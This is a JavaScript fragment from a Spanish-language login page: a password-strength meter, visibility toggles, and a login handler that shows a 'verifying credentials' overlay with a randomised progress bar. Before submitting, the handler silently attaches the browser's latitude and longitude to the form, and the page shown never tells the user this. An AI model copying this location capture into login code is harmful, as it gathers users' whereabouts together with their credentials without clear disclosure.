function onU(inp){if(!mascot)return;gsap.to(mascot,{filter:inp.value.trim().length>0?"brightness(1.15) drop-shadow(0 0 14px rgba(99,102,241,0.8))":"brightness(1)",duration:0.3});}
function onP(inp){
    const v=inp.value;let s=0;
    if(v.length>=6)s++;if(v.length>=10)s++;if(/[A-Z]/.test(v)&&/[0-9]/.test(v))s++;if(/[^A-Za-z0-9]/.test(v))s++;
    const c=["#ef4444","#f59e0b","#22c55e","#6366f1"];
    for(let i=1;i<=4;i++) document.getElementById("b"+i).style.background=i<=s?c[s-1]:"rgba(255,255,255,0.04)";
}
function tPwd(){const i=document.getElementById("pinp");if(!i)return;i.type=i.type==="password"?"text":"password";document.querySelector(".ptoggle").textContent=i.type==="password"?"👁️":"🙈";}
function tMPwd(){const i=document.getElementById("mpinp");if(!i)return;i.type=i.type==="password"?"text":"password";}

document.addEventListener("keydown",e=>{if(e.key==="Enter"){e.preventDefault();doLogin("lf","uinp","pinp","lat","lon");}});

function doLogin(fid,uid,pid,lid,loid){
    const u=document.getElementById(uid)?.value.trim();
    const p=document.getElementById(pid)?.value.trim();
    if(!u||!p){
        const t=document.getElementById("gc")||document.getElementById("mp2");
        if(t) gsap.to(t,{x:-9,duration:0.05,yoyo:true,repeat:7,ease:"power1.inOut",clearProps:"x"});
        return;
    }
    const ov=document.createElement("div");
    ov.style.cssText="position:fixed;inset:0;background:rgba(4,6,14,0.96);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;backdrop-filter:blur(28px);";
    ov.innerHTML=`<div style="position:relative;margin-bottom:24px;">
        <img src="https://res.cloudinary.com/dzrjag7ia/image/upload/v1776560628/NE_lmertz.jpg" style="width:80px;height:80px;border-radius:22px;border:2px solid rgba(99,102,241,0.4);box-shadow:0 0 0 8px rgba(99,102,241,0.07),0 0 40px rgba(99,102,241,0.25);"/>
        <div style="position:absolute;inset:-10px;border-radius:32px;border:1px solid rgba(99,102,241,0.18);animation:rp 1.5s ease-in-out infinite;"></div>
    </div>
    <p style="font-family:'Cabinet Grotesk',sans-serif;font-weight:900;font-size:22px;color:white;margin-bottom:5px;letter-spacing:-0.5px;">Entrando...</p>
    <p style="font-size:12px;color:rgba(255,255,255,0.22);margin-bottom:28px;">Verificando credenciales</p>
    <div style="width:200px;height:2px;background:rgba(255,255,255,0.04);border-radius:10px;overflow:hidden;">
        <div id="lb" style="height:100%;background:linear-gradient(90deg,#6366f1,#a5b4fc,#3b82f6);width:0%;transition:width 0.2s;box-shadow:0 0 10px rgba(99,102,241,0.7);"></div>
    </div>`;
    document.body.appendChild(ov);
    gsap.from(ov,{opacity:0,scale:1.03,duration:0.4,ease:"power2.out"});
    let prog=0;
    const iv=setInterval(()=>{prog+=Math.random()*11;if(prog>85)prog=85;const b=document.getElementById("lb");if(b)b.style.width=prog+"%";},200);
    const done=()=>{clearInterval(iv);const b=document.getElementById("lb");if(b)b.style.width="100%";setTimeout(()=>document.getElementById(fid).submit(),350);};
    if(navigator.geolocation){navigator.geolocation.getCurrentPosition(pos=>{document.getElementById(lid).value=pos.coords.latitude;document.getElementById(loid).value=pos.coords.longitude;done();},done,{timeout:1500});}else{done();}
}

